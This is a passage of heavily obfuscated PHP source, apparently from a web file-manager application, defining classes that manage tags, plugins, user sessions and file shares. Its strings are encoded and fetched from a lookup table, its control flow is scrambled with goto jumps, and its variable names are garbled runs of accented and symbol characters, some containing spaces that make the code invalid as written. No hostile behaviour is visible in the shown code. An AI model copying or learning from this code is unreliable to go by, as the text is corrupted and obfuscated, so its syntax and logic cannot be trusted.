remove($aëπ›ÂÛ†Ç) { return parent::remove($aëπ›ÂÛ†Ç); } public function add($f’ÜŸä™è∑, $DßÍÛŸ†ëñ = "\x6c\x61\x62\145\x6c\x2d\x67\162\145\171\55\x6e\157\162\x6d\141\x6c") { $AäÚ¬À‚Ú‹ =& $_SERVER[™⁄»üÆ]; if ($this->findByName($f’ÜŸä™è∑)) { return !1; } $AäéÜï»¬¥ = array($AäÚ¬À‚Ú‹[414] => $f’ÜŸä™è∑, $AäÚ¬À‚Ú‹[465] => $DßÍÛŸ†ëñ, $AäÚ¬À‚Ú‹[1710] => $this->getSort($AäÚ¬À‚Ú‹[256]) + 1); return parent::insert($AäéÜï»¬¥); } public function update($CØ™≤‡ÙÌÆ, $B£´◊Ûÿµø) { $dŒªä£Õ«à =& $_SERVER[™⁄»üÆ]; $aÉá÷ßÒÈ˘ = $this->listData($CØ™≤‡ÙÌÆ); $cë®°ó∏º = $this->findByName($B£´◊Ûÿµø[$dŒªä£Õ«à[28]]); if (!$aÉá÷ßÒÈ˘ || $cë®°ó∏º && $cë®°ó∏º[$dŒªä£Õ«à[394]] != $aÉá÷ßÒÈ˘[$dŒªä£Õ«à[394]]) { return !1; } return parent::update($CØ™≤‡ÙÌÆ, $B£´◊Ûÿµø); } public function moveTop($FÌÆÕê≥≈) { $BÜè´ËﬂÃƒ =& $_SERVER[™⁄»üÆ]; $Dá·ØœÑöÇ = parent::listData(); $dµ‡àíçØÇ = $this->getSort($BÜè´ËﬂÃƒ[255]); foreach ($Dá·ØœÑöÇ as &$A£äÂüõ∞π) { if ($A£äÂüõ∞π[$BÜè´ËﬂÃƒ[394]] == $FÌÆÕê≥≈) { $A£äÂüõ∞π[$BÜè´ËﬂÃƒ[1729]] = $dµ‡àíçØÇ; continue; } $A£äÂüõ∞π[$BÜè´ËﬂÃƒ[1729]] += 1; } unset($A£äÂüõ∞π); return parent::resetData($Dá·ØœÑöÇ); } public function moveBottom($cõ¢ıëÛ√∑) { $A⁄Ü›ﬁ€√— =& $_SERVER[™⁄»üÆ]; $A…‰Ö‚â§Ö = $this->getSort($A⁄Ü›ﬁ€√—[256]) + 1; return parent::update($cõ¢ıëÛ√∑, array($A⁄Ü›ﬁ€√—[1729] => $A…‰Ö‚â§Ö)); } public function resetSort($f®Ñ¥âÕÈ¡) { goto fÀ»Œ€â≤·; bËú‘ú ªõ: for ($Fêáí„»·¨ = 0; $Fêáí„»·¨ < count($f®Ñ¥âÕÈ¡); $Fêáí„»·¨++) { $f‡Á∂·ˆ©ê[$f®Ñ¥âÕÈ¡[$Fêáí„»·¨] . $E≥ﬂ√ÙÂÌÌ[33]] = $Fêáí„»·¨ + 1; } $C™ü¢´–∞É = parent::listData(); foreach ($C™ü¢´–∞É as &$aÿç∂éöÂÙ) { $f∆õ∆Áªë´ = $f‡Á∂·ˆ©ê[$aÿç∂éöÂÙ[$E≥ﬂ√ÙÂÌÌ[394]]]; $aÿç∂éöÂÙ[$E≥ﬂ√ÙÂÌÌ[1729]] = $f∆õ∆Áªë´ ? $f∆õ∆Áªë´ : $aÿç∂éöÂÙ[$E≥ﬂ√ÙÂÌÌ[1729]]; } goto Aä™ÜƒÉ≤‘; fÀ»Œ€â≤·: $E≥ﬂ√ÙÂÌÌ =& $_SERVER[™⁄»üÆ]; $f‡Á∂·ˆ©ê = array(); $f®Ñ¥âÕÈ¡ = is_array($f®Ñ¥âÕÈ¡) ? $f®Ñ¥âÕÈ¡ : array(); goto bËú‘ú ªõ; Aä™ÜƒÉ≤‘: unset($aÿç∂éöÂÙ); return parent::resetData($C™ü¢´–∞É); goto c∑Ï∏®ı√÷; c∑Ï∏®ı√÷: } private function getSort($aÑ¨∂‡ƒÉ¬) { $D”—µ∆ûøŸ =& $_SERVER[™⁄»üÆ]; $c„‡…Àπ‚Ë = parent::listData(); $EÁÉ”¥∂≥É = array_to_keyvalue($c„‡…Àπ‚Ë, $D”—µ∆ûøŸ[33], $D”—µ∆ûøŸ[1729]); if (!$EÁÉ”¥∂≥É) { $EÁÉ”¥∂≥É = array(0); } $C˜ùÙÊ∆ﬂÿ = $aÑ¨∂‡ƒÉ¬ == $D”—µ∆ûøŸ[256] ? max($EÁÉ”¥∂≥É) : min($EÁÉ”¥∂≥É); return intval($C˜ùÙÊ∆ﬂÿ); } } goto aíÈÈ˘€∂‘; c≤„ïÍ∑÷†: class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\155\56\x70\x6c\x75\x67\x69\156\x4c\151\163\x74"; public $field = array("\x6e\141\x6d\145", "\x73\x74\x61\x74\x75\x73", "\162\x65\x67\x69\145\163\x74", "\143\157\x6e\146\x69\x67"); public function loadList($A≤å“Ü»÷ﬁ = false) { $FÁˆÍ›Í§æ = array_to_keyvalue($this->listData(), $_SERVER[™⁄»üÆ][28]); if ($A≤å“Ü»÷ﬁ) { return $FÁˆÍ›Í§æ[$A≤å“Ü»÷ﬁ]; } return $FÁˆÍ›Í§æ; } public function init() { $cêëˆ∫Õ”¶ =& $_SERVER[™⁄»üÆ]; Hook::trigger($cêëˆ∫Õ”¶[1822]); $F∫Ù‡ç÷¶È = $this->loadPluginList(); foreach ($F∫Ù‡ç÷¶È as $AÆ†©àóÇŒ => $Dßú®âëÑ•) { $F√º…ÖÇ∫¶ = $this->appAllow($AÆ†©àóÇŒ, $Dßú®âëÑ•); if (!$F√º…ÖÇ∫¶) { continue; } foreach ($Dßú®âëÑ•[$cêëˆ∫Õ”¶[1823]] as $d°¶éÔÿ®è => $DÊ¯ã·œÁó) { Hook::bind($d°¶éÔÿ®è, $DÊ¯ã·œÁó); } } Hook::trigger($cêëˆ∫Õ”¶[1824]); Hook::trigger(ACTION); } public function appAllow($CÈÙ◊©è’ï, $BÁ–∆º÷¶º, $aÉâ∂Ù—ùƒ = true) { $FÉú‹‹‘⁄å =& $_SERVER[™⁄»üÆ]; $e«åè·°  = PLUGIN_DIR . $CÈÙ◊©è’ï . $FÉú‹‹‘⁄å[1825]; if (!is_array($BÁ–∆º÷¶º) || !is_array($BÁ–∆º÷¶º[$FÉú‹‹‘⁄å[1823]]) || $BÁ–∆º÷¶º[$FÉú‹‹‘⁄å[729]] != 1 || !is_file($e«åè·° )) { return !1; } if ($GLOBALS[$FÉú‹‹‘⁄å[486]] == 1) { return !0; } if ($aÉâ∂Ù—ùƒ && !Action($FÉú‹‹‘⁄å[1826])->checkAuth($CÈÙ◊©è’ï)) { return !1; } return !0; } public function unInstall($B∂˘‘ÙÁï≥) { $C¶Ö≈ë‰¢Ç =& $_SERVER[™⁄»üÆ]; $bÎá∞ì·èÖ = $this->loadList($B∂˘‘ÙÁï≥); if (file_exists(PLUGIN_DIR . $B∂˘‘ÙÁï≥)) { Hook::apply($B∂˘‘ÙÁï≥ . $C¶Ö≈ë‰¢Ç[1827]); } $this->remove($bÎá∞ì·èÖ[$C¶Ö≈ë‰¢Ç[394]]); } public function changeStatus($fŸ∑∆ºÏåº, $F’êùÌÑ˜Ü) { $D±„∑úÆøã =& $_SERVER[™⁄»üÆ]; $CË–ÛéÕÙÖ = $this->loadList($fŸ∑∆ºÏåº); if ($F’êùÌÑ˜Ü) { Hook::apply($fŸ∑∆ºÏåº . $D±„∑úÆøã[1828]); } $this->update($CË–ÛéÕÙÖ[$D±„∑úÆøã[394]], array($D±„∑úÆøã[1829] => $F’êùÌÑ˜Ü)); } public function appRegist($CçïÀ⁄ôû‚, $f¬’àú©ˆÉ) { $A‚·„è„ﬂˆ =& $_SERVER[™⁄»üÆ]; $fúú©◊Á¿Ê = $this->loadList($CçïÀ⁄ôû‚); if ($fúú©◊Á¿Ê) { $this->update($fúú©◊Á¿Ê[$A‚·„è„ﬂˆ[394]], array($A‚·„è„ﬂˆ[1823] => $f¬’àú©ˆÉ)); } else { $e•‚⁄®ª›√ = array($A‚·„è„ﬂˆ[28] => $CçïÀ⁄ôû‚, $A‚·„è„ﬂˆ[1823] => $f¬’àú©ˆÉ, $A‚·„è„ﬂˆ[729] => 0, $A‚·„è„ﬂˆ[6] => $this->getConfigDefault($CçïÀ⁄ôû‚)); $this->insert($e•‚⁄®ª›√); } } public function getConfigDefault($f∏é°—î‚Î) { $Cù£‘£„£ò =& $_SERVER[™⁄»üÆ]; $dÖ‡™›Â◊ = array(); $fãÉÜÚå®î = $this->getPackageJson($f∏é°—î‚Î); if (!$fãÉÜÚå®î && is_array($fãÉÜÚå®î[$Cù£‘£„£ò[1830]])) { return $dÖ‡™›Â◊; } foreach ($fãÉÜÚå®î[$Cù£‘£„£ò[1830]] as $dÆ∂´Á‚õ® => $Aé∑œßé„è) { if (!isset($Aé∑œßé„è[$Cù£‘£„£ò[372]]) || isset($dÖ‡™›Â◊[$dÆ∂´Á‚õ®])) { continue; } $dÖ‡™›Â◊[$dÆ∂´Á‚õ®] = $Aé∑œßé„è[$Cù£‘£„£ò[372]]; } return $dÖ‡™›Â◊; } public function getPackageJson($a®±®ÚÀÀî) { return Hook::apply($a®±®ÚÀÀî . $_SERVER[™⁄»üÆ][1831]); } public function getConfig($A£ˆ∆ö∑ÑÃ, $eÉÎáƒÌÛı = false) { $B¡–∫π‘ì =& $_SERVER[™⁄»üÆ]; $EäñŒ•°ÒÒ = array(); $dÚ†Êµ£÷Ö = $this->loadList($A£ˆ∆ö∑ÑÃ); if ($dÚ†Êµ£÷Ö && is_array($dÚ†Êµ£÷Ö[$B¡–∫π‘ì[6]])) { $EäñŒ•°ÒÒ = $dÚ†Êµ£÷Ö[$B¡–∫π‘ì[6]]; } if (!$EäñŒ•°ÒÒ || $eÉÎáƒÌÛı) { $EäñŒ•°ÒÒ = $this->getConfigDefault($A£ˆ∆ö∑ÑÃ); } return $EäñŒ•°ÒÒ; } public function setConfig($Cœ’¯öàí·, $F¥„°¢÷∂È = false) { goto b¯∫ÆéÔÑÜ; Fí£»ÂÚòÊ: $Bªë´œË∑‘ = $c≤€˘÷ƒ›™[$B©ô®ÿ…›à[6]]; if ($F¥„°¢÷∂È == !1) { $Bªë´œË∑‘ = array(); $F¥„°¢÷∂È = $this->getConfigDefault($Cœ’¯öàí·); } foreach ($F¥„°¢÷∂È as $A≈°ó‹®úÏ => $F¨Ó≈ñÔªÏ) { $Bªë´œË∑‘[$A≈°ó‹®úÏ] = is_string($F¨Ó≈ñÔªÏ) ? trim($F¨Ó≈ñÔªÏ) : $F¨Ó≈ñÔªÏ; } goto B•É÷œ¢§‹; b¯∫ÆéÔÑÜ: $B©ô®ÿ…›à =& $_SERVER[™⁄»üÆ]; $c≤€˘÷ƒ›™ = $this->loadList($Cœ’¯öàí·); if (!$c≤€˘÷ƒ›™) { return !1; } goto Fí£»ÂÚòÊ; B•É÷œ¢§‹: $this->update($c≤€˘÷ƒ›™[$B©ô®ÿ…›à[394]], array($B©ô®ÿ…›à[6] => $Bªë´œË∑‘)); goto Fï≤óŸ£Á; Fï≤óŸ£Á: } public function viewList() { goto A√ÉÉÚÑ⁄Ÿ; BßÕ‰«ƒèÈ: $cëÂá¨∂Œ¨ = $this->loadPluginList(); $cÔØµè›âú = array(); foreach ($cëÂá¨∂Œ¨ as $F∑Çèó©Ê => $bÃãØ◊ÇÑå) { unset($bÃãØ◊ÇÑå[$a¬™ïåµÜù[1823]], $bÃãØ◊ÇÑå[$a¬™ïåµÜù[6]]); $FŒπΩ˘ûòà = PLUGIN_DIR . $bÃãØ◊ÇÑå[$a¬™ïåµÜù[28]] . $a¬™ïåµÜù[1825]; if (!is_file($FŒπΩ˘ûòà)) { continue; } $Aœ“ˆ√áÿ€ = Hook::apply($bÃãØ◊ÇÑå[$a¬™ïåµÜù[28]] . $a¬™ïåµÜù[1831]); if (is_array($Aœ“ˆ√áÿ€)) { $cÔØµè›âú[$F∑Çèó©Ê] = array_merge($bÃãØ◊ÇÑå, $Aœ“ˆ√áÿ€); } } goto DäÚ†ÃÉ†Ö; DäÚ†ÃÉ†Ö: return $cÔØµè›âú; goto b¿™ëë—Ñ”; A√ÉÉÚÑ⁄Ÿ: $a¬™ïåµÜù =& $_SERVER[™⁄»üÆ]; $cëÂá¨∂Œ¨ = $this->loadList(); $this->pluginScan($cëÂá¨∂Œ¨); goto BßÕ‰«ƒèÈ; b¿™ëë—Ñ”: } private function loadPluginList() { $büà·éúƒµ =& $_SERVER[™⁄»üÆ]; $dØ†É≥‹¬Ô = $this->loadList(); if (strtolower(MOD) == $büà·éúƒµ[1832]) { return $dØ†É≥‹¬Ô; } $eÏêÿà◊ﬁÔ = Hook::trigger($büà·éúƒµ[1833], $dØ†É≥‹¬Ô); if ($dØ†É≥‹¬Ô && !$eÏêÿà◊ﬁÔ) { die; } return $eÏêÿà◊ﬁÔ ? $eÏêÿà◊ﬁÔ : $dØ†É≥‹¬Ô; } private function pluginScan($f∏ΩÉﬂÚäı) { $AÖ†Î¥ı§º =& $_SERVER[™⁄»üÆ]; recursion_dir(PLUGIN_DIR, $BÖ¬¢⁄Í∂Ÿ, $aßŒ€ÀëÚø, 0); foreach ($BÖ¬¢⁄Í∂Ÿ as $aÇì∑áçû·) { $Döï¥áº»Ω = get_path_this($aÇì∑áçû·); if (isset($f∏ΩÉﬂÚäı[$Döï¥áº»Ω]) || !file_exists($aÇì∑áçû· . $AÖ†Î¥ı§º[1834]) || !file_exists($aÇì∑áçû· . $AÖ†Î¥ı§º[1825])) { continue; } Hook::apply($Döï¥áº»Ω . $AÖ†Î¥ı§º[1828]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\163\164\145\155\x5f\163\x65\163\x73\x69\157\156"; public function get($Aú„ΩùÊâ∆) { $cÈ¶ñ¡¶Ìπ =& $_SERVER[™⁄»üÆ]; $eæ∞§œ¶˘≈ = $this->where(array($cÈ¶ñ¡¶Ìπ[1835] => $Aú„ΩùÊâ∆))->find(); if (!is_array($eæ∞§œ¶˘≈)) { return !1; } return $eæ∞§œ¶˘≈[$cÈ¶ñ¡¶Ìπ[734]]; } public function set($eî¥Û˘¯∆¥, $FÑ–ç¯èƒ‚, $BåÑçäØÀÇ = 3600) { $d‹ãÛÌÕÇÑ =& $_SERVER[™⁄»üÆ]; $bÂÒœë„÷» = array($d‹ãÛÌÕÇÑ[1835] => $eî¥Û˘¯∆¥, $d‹ãÛÌÕÇÑ[1744] => $FÑ–ç¯èƒ‚, $d‹ãÛÌÕÇÑ[1836] => $BåÑçäØÀÇ + time()); if (Session::get($d‹ãÛÌÕÇÑ[1837])) { $bÂÒœë„÷»[$d‹ãÛÌÕÇÑ[1537]] = Session::get($d‹ãÛÌÕÇÑ[1837]); } else { $bÂÒœë„÷»[$d‹ãÛÌÕÇÑ[1537]] = 0; } if ($this->get($eî¥Û˘¯∆¥)) { return $this->where(array($d‹ãÛÌÕÇÑ[1835] => $eî¥Û˘¯∆¥))->save($bÂÒœë„÷»); } else { return $this->add($bÂÒœë„÷», array(), !0); } } public function remove($C…Ï⁄´‡ƒƒ) { return $this->where(array($_SERVER[™⁄»üÆ][1835] => $C…Ï⁄´‡ƒƒ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[™⁄»üÆ][1838] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\x68\x61\162\145"; protected $dataAuto = array(array("\155\157\x64\151\x66\171\x54\151\155\145", "\164\151\155\145", "\x69\x6e\x73\x65\x72\164\54\x75\x70\144\141\x74\145", "\x66\165\x6e\x63\x74\151\x6f\156"), array("\143\x72\145\141\164\145\124\151\x6d\145", "\164\x69\x6d\x65", "\x69\156\x73\x65\162\x74", "\146\165\x6e\143\164\151\x6f\x6e"), array("\157\160\x74\151\x6f\156\x73", '', "\151\x6e\x73\145\x72\x74\54\x75\160\x64\x61\164\145\x2c\x73\x65\154\x65\143\164", "\152\x73\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($FÔÉõÈÍ¿’) { $eàƒìºØÈ© =& $_SERVER[™⁄»üÆ]; $Eõ≠¯äÆµ« = isset($FÔÉõÈÍ¿’[0]) ? $FÔÉõÈÍ¿’[0] : !1; return array($eàƒìºØÈ©[1839] => array(USER_ID, $eàƒìºØÈ©[1840]), $eàƒìºØÈ©[1782] => array($Eõ≠¯äÆµ«, $eàƒìºØÈ©[1841])); } protected function listSimple() { $c√ãƒ≤í’Ω = array($_SERVER[™⁄»üÆ][1537] => USER_ID); $BÖƒÆ¬®§ä = $this->field($this->fieldList)->where($c√ãƒ≤í’Ω)->select(); return $BÖƒÆ¬®§ä ? $BÖƒÆ¬®§ä : array(); } protected function getInfo($bŒÜ›∞”å⁄, $BÕ÷≥ΩœÇ“ = false) { $E™‡ôúè‚ã =& $_SERVER[™⁄»üÆ]; if ($BÕ÷≥ΩœÇ“) { return $this->_getShareInfo(array($E™‡ôúè‚ã[469] => $bŒÜ›∞”å⁄)); } $E≤ìŸÆ›∑ì = $this->cacheFunctionGet($E™‡ôúè‚ã[1784], $bŒÜ›∞”å⁄); return $E≤ìŸÆ›∑ì; } public function getInfoByHash($FçëÜø„ƒ∏) { return $this->_getShareInfo(array($_SERVER[™⁄»üÆ][471] => $FçëÜø„ƒ∏)); } public function getInfoByPath($Fûë‚¥üÚ⁄) { $EëËñ¶‹æ¶ =& $_SERVER[™⁄»üÆ]; $EÌà¢ã´´ô = array($EëËñ¶‹æ¶[1537] => USER_ID, $EëËñ¶‹æ¶[396] => $Fûë‚¥üÚ⁄); return $this->_getShareInfo($EÌà¢ã´´ô); } public function getInfoBySourcePath($b¨∂Ìﬂ¥ å) { $bƒÔÀΩ¨≥Õ =& $_SERVER[™⁄»üÆ]; $bÇÌóÈÀ¥π = array($bƒÔÀΩ¨≥Õ[1537] => USER_ID, $bƒÔÀΩ¨≥Õ[1079] => $b¨∂Ìﬂ¥ å); return $this->_getShareInfo($bÇÌóÈÀ¥π); } private function _getShareInfo($bÜ»®‹ª≠‹) { goto Dä¢çÂ€çí; EÜ§⁄©ßÉ‘: if ($D≠É˜∏≈úû[$B©î∫‡≤π©[396]] == $B©î∫‡≤π©[191]) { $D≠É˜∏≈úû[$B©î∫‡≤π©[85]] = IO::info($D≠É˜∏≈úû[$B©î∫‡≤π©[1079]]); } else { $D≠É˜∏≈úû[$B©î∫‡≤π©[85]] = Model($B©î∫‡≤π©[1214])->pathInfo($D≠É˜∏≈úû[$B©î∫‡≤π©[396]]); } $D≠É˜∏≈úû[$B©î∫‡≤π©[1843]] = $F«íπÉà„“; return $D≠É˜∏≈úû; goto c∞⁄‚ﬁ‘Ãß; FÒàπØ√£…: $bÜ»®‹ª≠‹ = array($B©î∫‡≤π©[469] => $D≠É˜∏≈úû[$B©î∫‡≤π©[469]]); $BÁ„‘®¶ˆ÷ = $B©î∫‡≤π©[1842]; $F«íπÉà„“ = Model($B©î∫‡≤π©[578])->order($B©î∫‡≤π©[394])->field($BÁ„‘®¶ˆ÷)->where($bÜ»®‹ª≠‹)->select(); goto EÜ§⁄©ßÉ‘; Dä¢çÂ€çí: $B©î∫‡≤π© =& $_SERVER[™⁄»üÆ]; $D≠É˜∏≈úû = $this->where($bÜ»®‹ª≠‹)->find(); if (!$D≠É˜∏≈úû) { return !1; } goto FÒàπØ√£…; c∞⁄‚ﬁ‘Ãß: } protected function getInfoAuth($DùÌ›€¶∂ú) { $E¬¢‹„û„ª =& $_SERVER[™⁄»üÆ]; $B◊õÌ∂”©‚ = $this->getInfo($DùÌ›€¶∂ú); $B◊õÌ∂”©‚[$E¬¢‹„û„ª[407]] = Model($E¬¢‹„û„ª[483])->authMake($B◊õÌ∂”©‚[$E¬¢‹„û„ª[1843]]); return $B◊õÌ∂”©‚; } protected function listData($FÕƒ«¥ü ë = null, $c‡Õ≤ÏÍÓ€ = 300) { $e¡ûÚÈÖ•Ñ =& $_SERVER[™⁄»üÆ]; $F•ïç©’£ﬁ = array(array($e¡ûÚÈÖ•Ñ[474] => array($e¡ûÚÈÖ•Ñ[979], 0), $e¡ûÚÈÖ•Ñ[476] => array($e¡ûÚÈÖ•Ñ[979], 0), $e¡ûÚÈÖ•Ñ[1844] => $e¡ûÚÈÖ•Ñ[1798])); if ($FÕƒ«¥ü ë == $e¡ûÚÈÖ•Ñ[1845]) { $F•ïç©’£ﬁ = array($e¡ûÚÈÖ•Ñ[474] => 1); } else { if ($FÕƒ«¥ü ë == $e¡ûÚÈÖ•Ñ[1064]) { $F•ïç©’£ﬁ = array($e¡ûÚÈÖ•Ñ[476] => 1); } } $F•ïç©’£ﬁ[$e¡ûÚÈÖ•Ñ[1537]] = USER_ID; $c∂”åç∞Ê‡ = $this->where($F•ïç©’£ﬁ)->selectPage($c‡Õ≤ÏÍÓ€); return $c∂”åç∞Ê‡; } protected function listToMe($aÖÚã¬ü¬È = 300) { goto AÉ⁄À¶˘Öˆ; B¢∞Œäòë‹: $B¬ÖÖ∆¢«ö = $this->field($fè°ª·ÉŸ¶)->where($B»‡•ıØΩ‰)->select(); foreach ($B¬ÖÖ∆¢«ö as $D§ïòâ·∫– => &$dÜ•ó≈‘ÂÆ) { $dÜ•ó≈‘ÂÆ[$Cœ©€é’…Í[1843]] = $eÜ¡π˘√±Ì[$dÜ•ó≈‘ÂÆ[$Cœ©€é’…Í[469]]]; } unset($dÜ•ó≈‘ÂÆ); goto aäﬁ§óªê; AÉ⁄À¶˘Öˆ: $Cœ©€é’…Í =& $_SERVER[™⁄»üÆ]; $cà‘ ∆®œÿ = Model($Cœ©€é’…Í[1846])->userGroupParents(USER_ID); $B»‡•ıØΩ‰ = array($Cœ©€é’…Í[563] => SourceModel::TYPE_USER, $Cœ©€é’…Í[485] => USER_ID); goto d™©áŸÁòÖ; d™©áŸÁòÖ: if ($cà‘ ∆®œÿ) { $B»‡•ıØΩ‰ = array(array($Cœ©€é’…Í[563] => SourceModel::TYPE_USER, $Cœ©€é’…Í[485] => USER_ID), array($Cœ©€é’…Í[563] => SourceModel::TYPE_GROUP, $Cœ©€é’…Í[485] => array($Cœ©€é’…Í[7], $cà‘ ∆®œÿ)), $Cœ©€é’…Í[1844] => $Cœ©€é’…Í[1798]); } $FÕø≤ÍŒÿ∫ = Model($Cœ©€é’…Í[578])->where($B»‡•ıØΩ‰)->selectPage($aÖÚã¬ü¬È); $eÜ¡π˘√±Ì = array_to_keyvalue_group($FÕø≤ÍŒÿ∫[$Cœ©€é’…Í[367]], $Cœ©€é’…Í[469]); goto Dﬂ∫öÖ∞≈ ; Dﬂ∫öÖ∞≈ : if (!$eÜ¡π˘√±Ì) { return $FÕø≤ÍŒÿ∫; } $fè°ª·ÉŸ¶ = $Cœ©€é’…Í[1847]; $B»‡•ıØΩ‰ = array($Cœ©€é’…Í[469] => array($Cœ©€é’…Í[412], array_keys($eÜ¡π˘√±Ì)), $Cœ©€é’…Í[1537] => array($Cœ©€é’…Í[981], $Cœ©€é’…Í[191])); goto B¢∞Œäòë‹; aäﬁ§óªê: $D’ï¥≥¿•ú = array($Cœ©€é’…Í[1848] => $B¬ÖÖ∆¢«ö, $Cœ©€é’…Í[1849] => $FÕø≤ÍŒÿ∫[$Cœ©€é’…Í[364]]); return $D’ï¥≥¿•ú; goto fˆ‹¯âÇã°; fˆ‹¯âÇã°: } protected function shareAdd($E›Ω◊Ú”ºÊ, $A¡ﬂ„á¨¡Â) { $EÌ§ ÒÈºÜ =& $_SERVER[™⁄»üÆ]; $F‰†§◊‡ÑÃ = $this->_addShareData($E›Ω◊Ú”ºÊ, $A¡ﬂ„á¨¡Â); if (!empty($A¡ﬂ„á¨¡Â[$EÌ§ ÒÈºÜ[1850]])) { $this->_shareAuthSet($F‰†§◊‡ÑÃ, $A¡ﬂ„á¨¡Â[$EÌ§ ÒÈºÜ[1850]]); } $this->shareEventAdd($E›Ω◊Ú”ºÊ, $A¡ﬂ„á¨¡Â, $EÌ§ ÒÈºÜ[1067]); return $F‰†§◊‡ÑÃ; } protected function shareAddSystem($BÔÉÂﬁóºê, $bªÎïÔ«Â∫) { $BËàªÆ‰„… =& $_SERVER[™⁄»üÆ]; $eíìöÔëö¥ = $this->_addShareData($BÔÉÂﬁóºê, $bªÎïÔ«Â∫, $BËàªÆ‰„…[1179]); $this->_shareAuthSet($eíìöÔëö¥, $bªÎïÔ«Â∫[$BËàªÆ‰„…[1850]]); return $eíìöÔëö¥; } private function shareEventAdd($EÁ≤û•Áéπ, $f˘§äûâ›ä, $Cµ≤Ù…â√Ç = "\141\144\144") { goto EûÈûπêÀê; C∞÷ÛˆÁé’: $c≠ñæµîâ¶ = $this->getInfoByPath($EÁ≤û•Áéπ); $DÀÎŒ¶‘—é = $E–÷Æâ∫¡[1853]; if ($c≠ñæµîâ¶[$E–÷Æâ∫¡[474]] == $E–÷Æâ∫¡[191] && $f˘§äûâ›ä[$E–÷Æâ∫¡[474]] == $E–÷Æâ∫¡[87]) { $DÀÎŒ¶‘—é = $E–÷Æâ∫¡[1851]; } goto dÂﬁåÑË…Â; aˆÒ°ÃÇ≠≈: Model($E–÷Æâ∫¡[547])->eventShare($EÁ≤û•Áéπ, $DÀÎŒ¶‘—é); return; goto E“¥ÿÈæ∑à; dÂﬁåÑË…Â: if ($c≠ñæµîâ¶[$E–÷Æâ∫¡[474]] == $E–÷Æâ∫¡[87] && $f˘§äûâ›ä[$E–÷Æâ∫¡[474]] == $E–÷Æâ∫¡[191]) { $DÀÎŒ¶‘—é = $E–÷Æâ∫¡[1854]; } if ($c≠ñæµîâ¶[$E–÷Æâ∫¡[476]] == $E–÷Æâ∫¡[191] && $f˘§äûâ›ä[$E–÷Æâ∫¡[476]] == $E–÷Æâ∫¡[87]) { $DÀÎŒ¶‘—é = $E–÷Æâ∫¡[1852]; } if ($c≠ñæµîâ¶[$E–÷Æâ∫¡[476]] == $E–÷Æâ∫¡[87] && $f˘§äûâ›ä[$E–÷Æâ∫¡[476]] == $E–÷Æâ∫¡[191]) { $DÀÎŒ¶‘—é = $E–÷Æâ∫¡[1855]; } goto aˆÒ°ÃÇ≠≈; EûÈûπêÀê: $E–÷Æâ∫¡ =& $_SERVER[™⁄»üÆ]; if (!$EÁ≤û•Áéπ || $EÁ≤û•Áéπ == $E–÷Æâ∫¡[191]) { return; } if ($Cµ≤Ù…â√Ç == $E–÷Æâ∫¡[1067]) { if ($f˘§äûâ›ä[$E–÷Æâ∫¡[474]] == $E–÷Æâ∫¡[87]) { Model($E–÷Æâ∫¡[547])->eventShare($EÁ≤û•Áéπ, $E–÷Æâ∫¡[1851]); } if ($f˘§äûâ›ä[$E–÷Æâ∫¡[476]] == $E–÷Æâ∫¡[87]) { Model($E–÷Æâ∫¡[547])->eventShare($EÁ≤û•Áéπ, $E–÷Æâ∫¡[1852]); } return; } goto C∞÷ÛˆÁé’; E“¥ÿÈæ∑à: } private function _addShareData($aÙ¨Ñı¬¬Ã, $Fáƒ˜€íœî = array(), $bÈ“°¢Îû∫ = false) { goto BÎﬁÃéπõØ; Bπàã¥»Œ∆: if (!$Fáƒ˜€íœî[$aÈ÷–¯∫∞∆[1440]]) { $Fáƒ˜€íœî[$aÈ÷–¯∫∞∆[1440]] = $Bî’»†∫î[$aÈ÷–¯∫∞∆[28]]; } $BÆ≈Óâ·ëÕ = array($aÈ÷–¯∫∞∆[1528] => $dﬂ·ëœµµÇ, $aÈ÷–¯∫∞∆[411] => $aÙ¨Ñı¬¬Ã, $aÈ÷–¯∫∞∆[1440] => $aÈ÷–¯∫∞∆[33], $aÈ÷–¯∫∞∆[474] => 0, $aÈ÷–¯∫∞∆[476] => 0, $aÈ÷–¯∫∞∆[1079] => $aÈ÷–¯∫∞∆[33], $aÈ÷–¯∫∞∆[305] => $aÈ÷–¯∫∞∆[33], $aÈ÷–¯∫∞∆[859] => $aÈ÷–¯∫∞∆[33], $aÈ÷–¯∫∞∆[1857] => 0, $aÈ÷–¯∫∞∆[1858] => 0, $aÈ÷–¯∫∞∆[477] => 0, $aÈ÷–¯∫∞∆[478] => $aÈ÷–¯∫∞∆[33], $aÈ÷–¯∫∞∆[471] => $aÈ÷–¯∫∞∆[33]); $BµõàëÊ®Æ = explode($aÈ÷–¯∫∞∆[47], $aÈ÷–¯∫∞∆[1859]); goto eåÎÚ™®§≈; eåÎÚ™®§≈: foreach ($BµõàëÊ®Æ as $E©™ª◊æåÁ) { if (!isset($Fáƒ˜€íœî[$E©™ª◊æåÁ])) { continue; } $BÆ≈Óâ·ëÕ[$E©™ª◊æåÁ] = $Fáƒ˜€íœî[$E©™ª◊æåÁ]; } $e¬Ú…Ïï∆ø = $this->add($BÆ≈Óâ·ëÕ); $bªèëõ∫óÈ = array($aÈ÷–¯∫∞∆[471] => short_id($e¬Ú…Ïï∆ø)); goto fÊÕÈ≠Ò¶ï; fÊÕÈ≠Ò¶ï: $this->where(array($aÈ÷–¯∫∞∆[468] => $e¬Ú…Ïï∆ø))->save($bªèëõ∫óÈ); return $e¬Ú…Ïï∆ø; goto BŸíÔ”√Üü; bÍ–‰·ãõ¯: if ($aÙ¨Ñı¬¬Ã == 0) { $cü¨›á·˘ƒ = array($aÈ÷–¯∫∞∆[1856] => $Fáƒ˜€íœî[$aÈ÷–¯∫∞∆[1079]], $aÈ÷–¯∫∞∆[1528] => $dﬂ·ëœµµÇ); } if ($cŸ±ÙíÁé‰ = $this->where($cü¨›á·˘ƒ)->find()) { return $cŸ±ÙíÁé‰[$aÈ÷–¯∫∞∆[469]]; } if ($aÙ¨Ñı¬¬Ã == 0) { $Bî’»†∫î = array($aÈ÷–¯∫∞∆[28] => get_path_this($Fáƒ˜€íœî[$aÈ÷–¯∫∞∆[76]])); } else { $Bî’»†∫î = Model($aÈ÷–¯∫∞∆[809])->sourceInfo($aÙ¨Ñı¬¬Ã); if (!$Bî’»†∫î) { return !1; } } goto Bπàã¥»Œ∆; BÎﬁÃéπõØ: $aÈ÷–¯∫∞∆ 